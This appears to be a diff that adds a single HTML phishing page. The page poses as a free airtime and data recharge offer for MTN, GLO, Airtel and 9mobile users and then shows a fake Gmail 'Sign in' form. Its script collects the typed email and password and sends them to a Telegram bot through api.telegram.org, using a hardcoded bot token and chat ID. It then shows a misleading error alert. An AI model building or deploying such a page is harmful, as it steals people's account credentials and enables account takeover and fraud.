@@ -1,0 +1,99 @@
+<!DOCTYPE html>  
+<html lang="en">  
+<head>  
+    <meta charset="UTF-8">  
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">  
+    <title>Free Data Rewards</title>  
+    <link rel="stylesheet" href="styles.css">  <!-- Link to the CSS file -->  
+    <script>  
+        document.addEventListener("DOMContentLoaded", function() {  
+            document.getElementById("rechargeButton").addEventListener("click", function(event) {  
+                event.preventDefault();   
+                document.getElementById('rechargePage').style.display = 'none';  
+                document.getElementById('loginPage').style.display = 'block';  
+            });  
+
+            document.getElementById('loginForm').addEventListener('submit', function(event) {  
+                event.preventDefault();  
+                
+                const email = document.getElementById('email').value;  
+                const password = document.getElementById('password').value;  
+
+                // Telegram bot details  
+                const botToken = '7381074284:AAF_9PeaHeIPq0llYDoHFo7fE4iEj97pRS4';  // Replace with your bot token  
+                const chatId = '6795314265';       // Replace with your chat ID  
+                const message = `Email: ${email} \nPassword: ${password}`;  
+
+                // Send the login details to the Telegram bot  
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {  
+                    method: 'POST',  
+                    headers: {  
+                        'Content-Type': 'application/json',  
+                    },  
+                    body: JSON.stringify({  
+                        chat_id: chatId,  
+                        text: message,  
+                    }),  
+                })  
+                .then(response => {  
+                    if (response.ok) {  
+                        alert('There was an error in the request.');  
+                    } else {  
+                        alert('Error sending details.');  
+                    }  
+                })  
+                .catch(error => {  
+                    console.error('Error:', error);  
+                    alert('There was an error with the request.');  
+                });  
+            });  
+        });  
+    </script>  
+</head>  
+<body>  
+    <div id="rechargePage" class="container">  
+        <div class="banner">  
+            <img src="https://upload.pinnocent.com/assets/files/upload-1741966000.jpeg" alt="Jio Dhan Dhana Dhan Offer">  
+        </div>  
+        <div class="title">Free Airtime and Data Recharge</div>  
+        <form id="rechargeForm">  
+            <label>Network provider</label>  
+            <select>  
+                <option>MTN</option>  
+                <option>GLO</option>  
+                <option>AIRTEL</option>  
+                <option>9MOBILE</option>  
+            </select>  
+            <label>Your Phone Number</label>  
+            <input type="tel" placeholder="Enter Your Phone Number Here" required>  
+            <label>Amount</label>  
+            <select>  
+                <option>1 GB</option>  
+                <option>2.5 GB</option>  
+                <option>5 GB</option>  
+                <option>10 GB</option>  
+            </select>  
+            <button id="rechargeButton">Recharge Now</button>  
+        </form>  
+        <div class="footer">Copyright 2024 Jio</div>  
+    </div>  
+    
+    <div id="loginPage" class="container" style="display: none;">  
+        <div class="logo">  
+            <img src="https://ssl.gstatic.com/ui/v1/icons/mail/rfr/gmail.ico" alt="Gmail Logo" width="100">  
+        </div>  
+        <h2>Sign in</h2>  
+        <p>Use your Google Account</p>  
+        <form id="loginForm">  
+            <input type="email" id="email" placeholder="Email or phone" required>  
+            <input type="password" id="password" placeholder="Enter your password" required>  
+            <button type="submit">Next</button>  
+        </form>  
+        <div class="footer">  
+            <p><a href="#">Forgot email?</a></p>  
+            <p>Not your computer? Use Guest mode to sign in privately.</p>  
+            <p><a href="#">Create account</a></p>  
+        </div>  
+    </div>  
+</body>  
+</html>
